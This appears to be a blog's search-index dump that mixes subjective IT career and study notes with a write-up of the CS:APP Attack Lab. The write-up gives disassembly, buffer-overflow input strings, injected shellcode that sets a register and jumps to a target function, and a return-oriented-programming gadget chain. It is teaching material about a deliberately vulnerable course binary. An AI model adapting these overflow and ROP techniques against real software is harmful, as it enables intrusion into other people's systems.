VB（微软搞得）这样的技术要小心，只有一个针对点。\n！！微信小程序！！有可能生成了一种主流，但是要保持警惕。这样的赌注对你来说值不值得？\n一个要素的专用性越小，那么它从一种用途到另一种用途的可转变性就越大。JAVA并非针对某一种产品研发的语言。\n完全专用性在价值变动方面造成的影响要远远大于专用性程度造成的影响。\n学习记笔记的方法与心得 # IT要不要记笔记，怎么记笔记，有用，但看怎么记笔记。传统教育的问题，台上PPT，书本上学习的知识，笔记起到梳理的作用，笔记不是给自己看书法，争取起到有效的作用，尽量简洁，如果文字太多，尽量迅速筛选信息，纸质翻阅可能较为麻烦，自己看不懂，两个字，争取有效，可以尽量记到计算机上，打字比写字更快，不一定非要跟上时代的潮流，但是如果有效率更高的方法，那就去做。可以用Ipad，在PDF上标注，你要有需求用到它，而不是先去买这个东西。\n关于必修课，上课老师是不是按照这个教科书来的，搞清楚这一点，注意分配好自己的注意力。文综类的课程，关键点，经济学原理，这样的东西应当学会浓缩，听清楚这样一个点，听清楚要讲一个什么主题，什么观点，什么论点，关键证明手段。你记笔记的最好时间，厘清思路的最好时间，就是老师吹nb的时候。\nD define 关于这样的一个定义，是重点。这节课的点是什么，这节课讲述的结构是什么，建立起来逻辑，思维和记忆就会变得清晰，举了什么样的例子，也是十分重要的内容，我记笔记，是为了搞清楚结构和逻辑，而不是说，你一直抄我们书上有的内容与知识，这显然没有意义，我听了二三十分钟欧拉图，居然没有先建立欧拉图的具体概念，那你上课就是听天书。\n博客，博客是给别人看的，笔记是给自己看的，给自己梳理东西的，勾勾画画只有自己能看懂，不要浪费自己的时间，你看看之前的杰作，有许多人记笔记自己不好好看，那就没有任何的意义，你给别人看，就是要搞得谨慎一点，二者有着明显的区别。多多写对于自己的笔记和心得，自己应该在哪里更加注意，不要去记常识性的，一般性的东西，总之，我们说讲究一个，高效，实用，讲求逻辑。。。\n我们良好的一个状态，是说我们记的笔记越来越少，而学习的速度越来越快。\n引用自原博主动态：\n动态：新的开学季。 初高中：现在知道学历有下限了吧？ 大一：搞好生活，适应大学环境，搞懂大学的套路，不逃课、不早退、及时交作业就意味着平时分过了。学习、生活、社交、活动、比赛\u0026hellip;几头抓的，最后肯定很惨。大一刚开学搞明白大学生活，照顾好自己就足够了。 大二：一年过去了，大学生活和照顾自己都没问题了，已经摸清楚上课、活动、社交等各种逻辑，接下来就该考虑自己职业问题，是做什么？什么方向？什么领域？什么具体职位呢？尽可能无视各种社交活动，无视大学任何比赛，无视大学所有的战略培养计划，无视大学教师和学姐学长的建议，无视学习路线。把精力放在追逐具体职位的共性技术上，这一点我们在IT疑问点已经讲得十分清晰，愿能为你们节省数年时间，互联网信息繁杂，此方法可以避开各种坑。 大三：你应该已经处于追逐职业生涯的半路上了。专科的学生如果能升本科最好不过，本科的学生根据自己的职业需求来升级学历，最低下限学历是存在的，但不存在高学历的上限。如果扫厕所，可能需要初中学历，你已经满足，所以不要傻了吧唧的往前考，没有意义。除非是有意义的考，有些职位在行业里就要求博士，那你必须得考，除此之外白费功夫。 大四：实习，面试。面试才是最好的检验方法，除此之外，没有任何技术和方法能够检验你是否可以就业的水准。去吧，一定要去大城市，小城市是没有就业的：北上广深杭。五个都可以选。如果校招给力，建议走校招；如果你给力，直接去大厂官网应聘。 不论如何，对于技术的培养唯有持续不断地摸索与训练，而非单纯的计划与追踪。\n谈谈中国游戏开发 # 喜欢打游戏，没有经历过什么是游戏的开发。一个团队热爱开发游戏。R星 GTA5 荒野大镖客 RIOT games LOL 为创造游戏而生，体验开发游戏的艰辛，也体验开发游戏的成就。\n游戏的本质是软件，开发游戏不代表编程，C/S架构，不完全是，需要图形和渲染（游戏渲染引擎），\nUnity3D 美工 艺术视觉设计 数字媒体 在引擎中训练 编写成庞大的系统 服务器（后端）\n反作弊系统（安全开发工程师） 编剧 导演 设计师。。。牵扯了大量的职位\n独立开发者，光明记忆真的是一个人做的么？想要成功，一定要合作，认真去找。\n任何天才，都不能在孤独的环境中发展。\n打字训练 # 推荐网站：Typing club 网站 多加练习 Qwerty learner 多加练习，每天都练习，会有极恐怖的进步。。。\n谈谈数据结构使用代码实现 # 计算机中存储，组织数据的方式，用什么样的语言实现不重要，目前的教学方式就是用垃圾的代码去实现垃圾的数据结构，不理解数据结构的实现原理，而去看代码来理解。\n正确的数据结构可以提高算法的效率。Pop oop 都能实现，但方式明显不同，不要关注语言，语言来的快，去的也快，因为市场是多变的。了解底层。\n作业做不了，是因为语法不够熟练。（for嵌套，递归？这样的作业）\n计算机语言的共性，软件工程的一些术语 # 流程控制：循环，条件判断（控制结构），子函数（方法Java）\n我们所做的一些基本题，都是围绕着if for来进行的。重要的是一种感觉，用什么东西去处理，需要大量的练习，用什么语句，要几层的循环，要在纸上多写一写思路和结构，先想清楚，效率才会明显提升。。。。。。\n定时，效率 进行算法的练习\n结构化处理\n結構化的非區部控制流程\n有些程式語言會提供非區部的控制流程（non-local control flow），會允許流程跳出目前的程式碼，進入一段事先指定的程式碼。常用的結構化非區部控制流程可分為條件處理、异常处理及計算續體（Continuation）三種。\n异常处理：在编程语言领域，通常 例外（英語：）这一术语所描述的是一种資料结构，该資料结构可以存储异常（exceptional）相关訊息。例外处理的常见的一种机制是移交控制权。引发（raise）异常，也叫作抛出（throw）异常，通过该方式达到移交控制权的效果。例外抛出后，控制权会被移交至某处的接（catch），并执行处理。\n（比如C语言下标的越界）\n计算机续体：创建了一个全局的变量，未来在某个控制流中使用它，感觉是提前定义了一些东西。\n竞争 # 竞争的实质。做自己的第一名，产生特色，竞争的赢家只有第一名和第二名。你活在什么样的幸福里，父母给你摆平的路，给你营造的氛围，给你某某的规划，或者沉浸于学校好的骄傲感中，或者是什么实验班的就业计划\u0026hellip;\u0026hellip;\n务实与态度 # 年轻人要讲求务实，不能认为自己参加了一个什么比赛，获得过什么奖就能跨越一个阶层，你去面试外企，别人不会注意你比赛第几名，拿了什么奖，一点：你能不能帮公司解决这个问题，难道提升我们的教育水平，只能用比赛？？？这样的教育令人感到心寒。我们中国人喜欢比赛，宣传，形式主义，我们太在意表面现象，而不去追究深层次的问题，不追求深层次的东西，IT这个行业，我们是干不下去的，你想当什么样的人，你想干什么样的事，比狗p什么比赛更重要，不要认为只要你参加某某比赛，就能。。。我只要。。。就能。。。？？？此等幻想，同样应当干掉。能爬上去，一定是通过自己的努力，觉得学历不够，就去考。\n你选了一个自己不喜欢的专业，但是还能坚持学下去，并且当成乐趣，这就是tmd态度。你来学校是干嘛的？学习起来太费劲，高考好不容易完事儿了，为什么还要学习？觉得要学习的东西就像大海一样多，我怎么才能掌握这么多东西，我什么东西都要会，因此而迷茫。\n“做什么事情，不管是否是你想做的，既然你去做了，就把它做好，不管是不是你想象的样子，尝试去热爱它。”——态度\n你对真正想要做的事情有没有爱。\n“我心尽在此作。”\n面试 # No Job Is Perfect! 这里我认为还不重要，因为我们大多还是实习生（作为一个大学生的话），面试就是大量的实战并且积累经验，前提是你有足够扎实的底层知识。\n谈谈你的简历？\n目的：不是列举成就以及职责，想要一个重点突出的内容，这个职位为什么适合你？\n目的是阐述关联度，展示清晰的职业目标，你在哪里干了什么有特色的事情（20%缓存时间减少\u0026hellip;\u0026hellip;），是适合这个岗位的。\n明确过渡：离职的原因？（好好解释，没上班的时间怎么保持跟进技术的迭代）突出专业的声誉，要是有战略性的步骤。\n裁员：公司改变了策略。\n强调技能的不断提升，最好两三分钟结束。\n","date":"21 March 2025","externalUrl":null,"permalink":"/thinking/itsolving_problems/","section":"Thinking","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是《響け！ユーフォニアム》配角之一，中川夏纪，声音真的很好听，听说这个动漫到《利兹与青鸟》就完结了来着（？）\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003e\u003cstrong\u003e关于IT行业的看法（IT另解笔记）\u003c/strong\u003e \n    \u003cdiv id=\"%E5%85%B3%E4%BA%8Eit%E8%A1%8C%E4%B8%9A%E7%9A%84%E7%9C%8B%E6%B3%95it%E5%8F%A6%E8%A7%A3%E7%AC%94%E8%AE%B0\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E5%85%B3%E4%BA%8Eit%E8%A1%8C%E4%B8%9A%E7%9A%84%E7%9C%8B%E6%B3%95it%E5%8F%A6%E8%A7%A3%E7%AC%94%E8%AE%B0\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e1.学历在CS的行业不会成为任何优势（但是它重要），过硬的技术和能力才是，记清楚这一点，才不会盲目。请勿再将未来的希望寄托在你所在的学校身上了，你的一切，你的兴趣，都要自己费力去追寻\u0026hellip;\u0026hellip;\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2.Caution!本篇博文是强烈带有主观意见的意识流笔记，部分观点可能跟不上时代（2021年），并且不代表笔者的全部观点，但是希望能对于在校的尚对于目标不明确的学生带来一些帮助，视频来源（https://space.bilibili.com/19658621），顺带推荐一下他的C语言视频，如果你还没有学过，或者已经工作但是有进一步理解的需要，学习一下这个视频，会颠覆你对于POP编程的认知。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e3.随着我个人的阅历和经验的增长，我会不断更新这个文章的内容，直到它能够替代我对于这个行业的全部看法而不是简单的视频笔记，我个人的看法就是纯主观的，一个人或者一个组织都不可能给出所谓的“纯粹理性客观”这样的观点，如果真的是这样，那么很多历史怎么会被改写？总之，希望能帮助到你一点的同时也能满足我的分享欲。\u003c/strong\u003e\u003c/p\u003e","title":"IT:Solving_Problems","type":"thinking"},{"content":" What has always made the state a hell on earth has been precisely that man has tried to make it his heaven.\n\u0026ndash;F.Hoelderlin\n","date":"21 March 2025","externalUrl":null,"permalink":"/thinking/","section":"Thinking","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eWhat has always made the state a hell on earth has been precisely that man has tried to make it his heaven.\u003c/strong\u003e\u003c/p\u003e","title":"Thinking","type":"thinking"},{"content":" 本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。\nCSAPP:AttackLab # [!WARNING]\n通过本实验，你将学习到利用安全性漏洞攻击操作系统和网络服务器的方法。本实验的目的是通过模拟攻击来增进对安全漏洞的理解和防范意识，了解安全漏洞的本质。本实验内容应仅用于学习目的，严禁用于任何非法或不道德的活动。 本实验开始前，需要学习CS:APP3e第3.10.3节和第3.10.4节的知识。 https://arthals.ink/blog/attack-lab 你还是可以参考这位的博客。 scp -p -r 2236115135-ics@x86.ics.xjtu-ants.net:./attacklab-2236115135-1235135 ~/ //scp下载远程服务器上的文件，如果要本地开发这是好的办法 前三层是CI（代码注入攻击）攻击，后两层是ROP（返回导向编程）攻击。\n代码注入攻击（Code Injection Attacks） # phase1: # 0000000000401a90 \u0026lt;test\u0026gt;: 401a90:\t48 83 ec 08 sub $0x8,%rsp ; 分配了八个字节的空间 401a94:\tb8 00 00 00 00 mov $0x0,%eax 401a99:\te8 31 fe ff ff call 4018cf \u0026lt;getbuf\u0026gt; ; 调用了getbuf函数 401a9e:\t89 c2 mov %eax,%edx 401aa0:\tbe e8 31 40 00 mov $0x4031e8,%esi 401aa5:\tbf 01 00 00 00 mov $0x1,%edi 401aaa:\tb8 00 00 00 00 mov $0x0,%eax 401aaf:\te8 3c f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401ab4:\t48 83 c4 08 add $0x8,%rsp 401ab8:\tc3 ret 00000000004018cf \u0026lt;getbuf\u0026gt;: 4018cf:\t48 83 ec 38 sub $0x38,%rsp ; 分配了56个字节的空间（在buf里） 4018d3:\t48 89 e7 mov %rsp,%rdi 4018d6:\te8 7e 02 00 00 call 401b59 \u0026lt;Gets\u0026gt; 4018db:\tb8 01 00 00 00 mov $0x1,%eax 4018e0:\t48 83 c4 38 add $0x38,%rsp 4018e4:\tc3 ret 00000000004018e5 \u0026lt;touch1\u0026gt;: 4018e5:\t48 83 ec 08 sub $0x8,%rsp 4018e9:\tc7 05 2d 2c 20 00 01 movl $0x1,0x202c2d(%rip) # 604520 \u0026lt;vlevel\u0026gt; 4018f0:\t00 00 00 4018f3:\tbf 22 31 40 00 mov $0x403122,%edi 4018f8:\te8 53 f4 ff ff call 400d50 \u0026lt;puts@plt\u0026gt; 4018fd:\tbf 01 00 00 00 mov $0x1,%edi 401902:\te8 92 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401907:\tbf 00 00 00 00 mov $0x0,%edi 40190c:\te8 bf f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 我要把return的地址覆盖成上面的touch1函数的首地址以执行touch1函数。\n那么直接构造如下的输入字符串即可，记得使用hex2raw工具。\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e5 18 40 00 phase2: # 这里的操作就是：1.同理覆盖地址。2.你要传一个参数来执行你的代码。\n我要把覆盖的地址变成touch2,同时要传参数。\n0000000000401911 \u0026lt;touch2\u0026gt;: 401911:\t48 83 ec 08 sub $0x8,%rsp 401915:\t89 fa mov %edi,%edx 401917:\tc7 05 ff 2b 20 00 02 movl $0x2,0x202bff(%rip) # 604520 \u0026lt;vlevel\u0026gt; 40191e:\t00 00 00 401921:\t39 3d 01 2c 20 00 cmp %edi,0x202c01(%rip) # 604528 \u0026lt;cookie\u0026gt; 401927:\t75 20 jne 401949 \u0026lt;touch2+0x38\u0026gt; 401929:\tbe 48 31 40 00 mov $0x403148,%esi 40192e:\tbf 01 00 00 00 mov $0x1,%edi 401933:\tb8 00 00 00 00 mov $0x0,%eax 401938:\te8 b3 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40193d:\tbf 02 00 00 00 mov $0x2,%edi 401942:\te8 52 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401947:\teb 1e jmp 401967 \u0026lt;touch2+0x56\u0026gt; 401949:\tbe 70 31 40 00 mov $0x403170,%esi 40194e:\tbf 01 00 00 00 mov $0x1,%edi 401953:\tb8 00 00 00 00 mov $0x0,%eax 401958:\te8 93 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40195d:\tbf 02 00 00 00 mov $0x2,%edi 401962:\te8 f4 03 00 00 call 401d5b \u0026lt;fail\u0026gt; 401967:\tbf 00 00 00 00 mov $0x0,%edi 40196c:\te8 5f f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 过程：覆盖调用函数的返回地址来执行我的代码（这相当于是在stack上执行我的代码，你想这要怎么做到？把ret要覆盖的地址设置成分配之后的rsp的值，那么rip便会从这里开始执行代码，我们再将代码放进缓冲区，好妙的攻击技巧），我的代码把%rdi设置成我的cookie值，并且通过ret指令返回到touch2函数执行。\n在getbuf分配完了栈空间之后，%rsp = 0x5563c8d8,这也就是缓冲区的起始地址。\n我们构造：\nmovq $0x14e6646f,%rdi ; 把第一个参数设置成cookie值 pushq $0x00401911 ; 这里push进去一个touch2的首地址值 ret ; ret实际上就是把刚刚push进去的值拿出来然后跳转执行 // gcc -c asm.s // objdump -d asm.o \u0026gt; asm.byte 我们拿到这段汇编指令的字节码 phase3: # 还是传参，但是会更麻烦，要调用更多的函数来解决这个问题,我要把我的cookie值作为一个string传给touch3。\n0000000000401971 \u0026lt;hexmatch\u0026gt;: 401971:\t41 54 push %r12 401973:\t55 push %rbp 401974:\t53 push %rbx 401975:\t48 83 c4 80 add $0xffffffffffffff80,%rsp 401979:\t89 fd mov %edi,%ebp 40197b:\t48 89 f3 mov %rsi,%rbx 40197e:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401985:\t00 00 401987:\t48 89 44 24 78 mov %rax,0x78(%rsp) 40198c:\t31 c0 xor %eax,%eax 40198e:\te8 bd f4 ff ff call 400e50 \u0026lt;random@plt\u0026gt; 401993:\t48 89 c1 mov %rax,%rcx 401996:\t48 ba 0b d7 a3 70 3d movabs $0xa3d70a3d70a3d70b,%rdx 40199d:\t0a d7 a3 4019a0:\t48 f7 ea imul %rdx 4019a3:\t48 01 ca add %rcx,%rdx 4019a6:\t48 c1 fa 06 sar $0x6,%rdx 4019aa:\t48 89 c8 mov %rcx,%rax 4019ad:\t48 c1 f8 3f sar $0x3f,%rax 4019b1:\t48 29 c2 sub %rax,%rdx 4019b4:\t48 8d 04 92 lea (%rdx,%rdx,4),%rax 4019b8:\t48 8d 14 80 lea (%rax,%rax,4),%rdx 4019bc:\t48 8d 04 95 00 00 00 lea 0x0(,%rdx,4),%rax 4019c3:\t00 4019c4:\t48 29 c1 sub %rax,%rcx 4019c7:\t4c 8d 24 0c lea (%rsp,%rcx,1),%r12 4019cb:\t41 89 e8 mov %ebp,%r8d 4019ce:\tb9 3f 31 40 00 mov $0x40313f,%ecx 4019d3:\t48 c7 c2 ff ff ff ff mov $0xffffffffffffffff,%rdx 4019da:\tbe 01 00 00 00 mov $0x1,%esi 4019df:\t4c 89 e7 mov %r12,%rdi 4019e2:\tb8 00 00 00 00 mov $0x0,%eax 4019e7:\te8 44 f4 ff ff call 400e30 \u0026lt;__sprintf_chk@plt\u0026gt; 4019ec:\tba 09 00 00 00 mov $0x9,%edx 4019f1:\t4c 89 e6 mov %r12,%rsi 4019f4:\t48 89 df mov %rbx,%rdi 4019f7:\te8 34 f3 ff ff call 400d30 \u0026lt;strncmp@plt\u0026gt; 4019fc:\t85 c0 test %eax,%eax 4019fe:\t0f 94 c0 sete %al 401a01:\t48 8b 5c 24 78 mov 0x78(%rsp),%rbx 401a06:\t64 48 33 1c 25 28 00 xor %fs:0x28,%rbx 401a0d:\t00 00 401a0f:\t74 05 je 401a16 \u0026lt;hexmatch+0xa5\u0026gt; 401a11:\te8 5a f3 ff ff call 400d70 \u0026lt;__stack_chk_fail@plt\u0026gt; 401a16:\t0f b6 c0 movzbl %al,%eax 401a19:\t48 83 ec 80 sub $0xffffffffffffff80,%rsp 401a1d:\t5b pop %rbx 401a1e:\t5d pop %rbp 401a1f:\t41 5c pop %r12 401a21:\tc3 ret 0000000000401a22 \u0026lt;touch3\u0026gt;: 401a22:\t53 push %rbx 401a23:\t48 89 fb mov %rdi,%rbx 401a26:\tc7 05 f0 2a 20 00 03 movl $0x3,0x202af0(%rip) # 604520 \u0026lt;vlevel\u0026gt; 401a2d:\t00 00 00 401a30:\t48 89 fe mov %rdi,%rsi 401a33:\t8b 3d ef 2a 20 00 mov 0x202aef(%rip),%edi # 604528 \u0026lt;cookie\u0026gt; 401a39:\te8 33 ff ff ff call 401971 \u0026lt;hexmatch\u0026gt; 401a3e:\t85 c0 test %eax,%eax 401a40:\t74 23 je 401a65 \u0026lt;touch3+0x43\u0026gt; 401a42:\t48 89 da mov %rbx,%rdx 401a45:\tbe 98 31 40 00 mov $0x403198,%esi 401a4a:\tbf 01 00 00 00 mov $0x1,%edi 401a4f:\tb8 00 00 00 00 mov $0x0,%eax 401a54:\te8 97 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a59:\tbf 03 00 00 00 mov $0x3,%edi 401a5e:\te8 36 02 00 00 call 401c99 \u0026lt;validate\u0026gt; 401a63:\teb 21 jmp 401a86 \u0026lt;touch3+0x64\u0026gt; 401a65:\t48 89 da mov %rbx,%rdx 401a68:\tbe c0 31 40 00 mov $0x4031c0,%esi 401a6d:\tbf 01 00 00 00 mov $0x1,%edi 401a72:\tb8 00 00 00 00 mov $0x0,%eax 401a77:\te8 74 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a7c:\tbf 03 00 00 00 mov $0x3,%edi 401a81:\te8 d5 02 00 00 call 401d5b \u0026lt;fail\u0026gt; 401a86:\tbf 00 00 00 00 mov $0x0,%edi 401a8b:\te8 40 f4 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 这是上面两个函数的C语言源代码：\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100;\t//这里随机分配可能导致的结果是把我们注入的字符串覆盖掉 sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } gdb调试（先跟第二层一样跳转到touch3）：\n先查看进入hexmatch之前的缓冲区，我们注入的代码还在（未使用的部分用3f填充）\n在进入了之后（我们发现有一部分已经被覆盖，但是没有威胁到我们的代码，所以这只是概率事件）：\n看起来28这里一直都是0,我们尝试把字符数组放在这里：\nman ascii //查看关于ascii的帮助 cookie\u0026mdash;\u0026gt;ascii\n0x14e6646f\u0026mdash;\u0026gt;31 34 65 36 36 34 36 66\n担心出错，再检查一遍：\n在更改的时候还要注意：不仅留心小端顺序，还要保证原来调用的函数的参数的值没有发生变化。\nQ：不知道为什么，28的位置写不进去，后面改成18的位置再重新写进去（记得更改rdi指向的地址，假如你错了的话）。\n返回导向编程（Return-oriented Programming） # phase4: # 在前面的情况下，我们都没有启用栈随机化和栈执行保护（在栈上执行代码本来就是一件很可疑的事情），那么就来了这种攻击方式。\n它要解决的还是上面的phase2和phase3的问题。\n这种攻击方式的思路就是说，我们不在栈上执行我们的代码，在它自己本身就有的代码里面挑挑拣拣来达到我们的目的，并且每次执行的指令后面都有c3这样就能不停的继续调用下去。\n汇编指令的相关字节码： # 这是它给我们的gadget表： # 0000000000401ab9 \u0026lt;start_farm\u0026gt;: 401ab9:\tb8 01 00 00 00 mov $0x1,%eax 401abe:\tc3 ret 0000000000401abf \u0026lt;addval_480\u0026gt;: 401abf:\t8d 87 6e a5 58 c3 lea -0x3ca75a92(%rdi),%eax ;2.3 58 c3 popq %rax (401ac3) ---1.1把rax设置成cookie的值 401ac5:\tc3 ret ; 就是这里，愚蠢的我一直把这里数错了导致几个小时没看出来为什么有segmentaion fault 0000000000401ac6 \u0026lt;getval_188\u0026gt;: 401ac6:\tb8 c8 89 c7 90 mov $0x90c789c8,%eax 401acb:\tc3 ret 0000000000401acc \u0026lt;addval_392\u0026gt;: 401acc:\t8d 87 58 91 c3 9e lea -0x613c6ea8(%rdi),%eax 401ad2:\tc3 ret 0000000000401ad3 \u0026lt;addval_406\u0026gt;: 401ad3:\t8d 87 ec ad d8 c3 lea -0x3c275214(%rdi),%eax 401ad9:\tc3 ret 0000000000401ada \u0026lt;getval_227\u0026gt;: 401ada:\tb8 65 48 89 c7 mov $0xc7894865,%eax ; 2.2 2.8 48 89 c7 movq %rax,%rdi(401adc) ---1.2把rdi设置成cookie值 401adf:\tc3 ret 0000000000401ae0 \u0026lt;getval_437\u0026gt;: 401ae0:\tb8 49 89 c7 90 mov $0x90c78949,%eax 401ae5:\tc3 ret 0000000000401ae6 \u0026lt;setval_348\u0026gt;: 401ae6:\tc7 07 48 89 c7 c3 movl $0xc3c78948,(%rdi) 401aec:\tc3 ret 0000000000401aed \u0026lt;setval_136\u0026gt;: 401aed:\tc7 07 58 90 90 90 movl $0x90909058,(%rdi) 401af3:\tc3 ret 0000000000401af4 \u0026lt;mid_farm\u0026gt;: 401af4:\tb8 01 00 00 00 mov $0x1,%eax 401af9:\tc3 ret 0000000000401afa \u0026lt;add_xy\u0026gt;: 401afa:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax ; 2.7(401afa) 这里就是直接设计好的 401afe:\tc3 ret 0000000000401aff \u0026lt;getval_314\u0026gt;: 401aff:\tb8 a9 c9 d6 90 mov $0x90d6c9a9,%eax 401b04:\tc3 ret 0000000000401b05 \u0026lt;addval_442\u0026gt;: 401b05:\t8d 87 48 09 e0 90 lea -0x6f1ff6b8(%rdi),%eax 401b0b:\tc3 ret 0000000000401b0c \u0026lt;addval_139\u0026gt;: 401b0c:\t8d 87 89 ca 90 90 lea -0x6f6f3577(%rdi),%eax 401b12:\tc3 ret 0000000000401b13 \u0026lt;addval_491\u0026gt;: 401b13:\t8d 87 1f 4b 89 d6 lea -0x2976b4e1(%rdi),%eax ; 2.6(401b17) mov %edx,%esi 401b19:\tc3 ret 0000000000401b1a \u0026lt;setval_367\u0026gt;: 401b1a:\tc7 07 bb 48 89 e0 movl $0xe08948bb,(%rdi) ; 2.1(401b1d) mov %rsp,%rax 401b20:\tc3 ret 0000000000401b21 \u0026lt;getval_215\u0026gt;: 401b21:\tb8 48 89 e0 c1 mov $0xc1e08948,%eax 401b26:\tc3 ret 0000000000401b27 \u0026lt;setval_192\u0026gt;: 401b27:\tc7 07 89 c1 92 90 movl $0x9092c189,(%rdi) 401b2d:\tc3 ret 0000000000401b2e \u0026lt;getval_418\u0026gt;: 401b2e:\tb8 89 ca 84 c0 mov $0xc084ca89,%eax ;2.5(401b2f) mov %ecx,%edx test %al,%al 401b33:\tc3 ret 0000000000401b34 \u0026lt;addval_318\u0026gt;: 401b34:\t8d 87 8b d6 84 c0 lea -0x3f7b2975(%rdi),%eax 401b3a:\tc3 ret 0000000000401b3b \u0026lt;setval_167\u0026gt;: 401b3b:\tc7 07 48 89 e0 94 movl $0x94e08948,(%rdi) 401b41:\tc3 ret 0000000000401b42 \u0026lt;setval_410\u0026gt;: 401b42:\tc7 07 df 89 ca 91 movl $0x91ca89df,(%rdi) 401b48:\tc3 ret 0000000000401b49 \u0026lt;setval_408\u0026gt;: 401b49:\tc7 07 95 48 81 e0 movl $0xe0814895,(%rdi) 401b4f:\tc3 ret 0000000000401b50 \u0026lt;setval_115\u0026gt;: 401b50:\tc7 07 88 d6 90 c3 movl $0xc390d688,(%rdi) 401b56:\tc3 ret 0000000000401b57 \u0026lt;setval_336\u0026gt;: 401b57:\tc7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401b5d:\tc3 ret 0000000000401b5e \u0026lt;addval_315\u0026gt;: 401b5e:\t8d 87 89 c1 a4 c0 lea -0x3f5b3e77(%rdi),%eax 401b64:\tc3 ret 0000000000401b65 \u0026lt;setval_400\u0026gt;: 401b65:\tc7 07 89 ca 28 d2 movl $0xd228ca89,(%rdi) 401b6b:\tc3 ret 0000000000401b6c \u0026lt;getval_226\u0026gt;: 401b6c:\tb8 88 d6 38 c0 mov $0xc038d688,%eax 401b71:\tc3 ret 0000000000401b72 \u0026lt;getval_388\u0026gt;: 401b72:\tb8 c9 c1 20 c9 mov $0xc920c1c9,%eax ; (401b75) 401b77:\tc3 ret 0000000000401b78 \u0026lt;getval_379\u0026gt;: 401b78:\tb8 68 89 e0 c3 mov $0xc3e08968,%eax 401b7d:\tc3 ret 0000000000401b7e \u0026lt;getval_495\u0026gt;: 401b7e:\tb8 89 d6 92 c3 mov $0xc392d689,%eax 401b83:\tc3 ret 0000000000401b84 \u0026lt;addval_434\u0026gt;: 401b84:\t8d 87 89 ca 28 d2 lea -0x2dd73577(%rdi),%eax 401b8a:\tc3 ret 0000000000401b8b \u0026lt;getval_382\u0026gt;: 401b8b:\tb8 4c 89 e0 c3 mov $0xc3e0894c,%eax 401b90:\tc3 ret 0000000000401b91 \u0026lt;addval_100\u0026gt;: 401b91:\t8d 87 c9 c1 84 c9 lea -0x367b3e37(%rdi),%eax 401b97:\tc3 ret 0000000000401b98 \u0026lt;setval_140\u0026gt;: 401b98:\tc7 07 f8 8b c1 c3 movl $0xc3c18bf8,(%rdi) 401b9e:\tc3 ret 0000000000401b9f \u0026lt;setval_104\u0026gt;: 401b9f:\tc7 07 88 c1 84 c0 movl $0xc084c188,(%rdi) 401ba5:\tc3 ret 0000000000401ba6 \u0026lt;addval_125\u0026gt;: 401ba6:\t8d 87 89 d6 90 c3 lea -0x3c6f2977(%rdi),%eax 401bac:\tc3 ret 0000000000401bad \u0026lt;getval_111\u0026gt;: 401bad:\tb8 16 a9 09 ca mov $0xca09a916,%eax 401bb2:\tc3 ret 0000000000401bb3 \u0026lt;getval_256\u0026gt;: 401bb3:\tb8 a9 ca 20 db mov $0xdb20caa9,%eax 401bb8:\tc3 ret 0000000000401bb9 \u0026lt;getval_170\u0026gt;: 401bb9:\tb8 89 c1 08 d2 mov $0xd208c189,%eax 401bbe:\tc3 ret 0000000000401bbf \u0026lt;setval_102\u0026gt;: 401bbf:\tc7 07 0e 89 c1 c3 movl $0xc3c1890e,(%rdi) ; 2.4(401bc2) mov %eax,%ecx 401bc5:\tc3 ret 0000000000401bc6 \u0026lt;getval_364\u0026gt;: 401bc6:\tb8 81 d6 90 90 mov $0x9090d681,%eax 401bcb:\tc3 ret 0000000000401bcc \u0026lt;setval_159\u0026gt;: 401bcc:\tc7 07 89 ca c1 ce movl $0xcec1ca89,(%rdi) 401bd2:\tc3 ret 0000000000401bd3 \u0026lt;end_farm\u0026gt;: 401bd3:\tb8 01 00 00 00 mov $0x1,%eax 401bd8:\tc3 ret 那么我们输入的字节码如下：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c3 1a 40 00 00 00 00 00 6f 64 e6 14 00 00 00 00 dc 1a 40 00 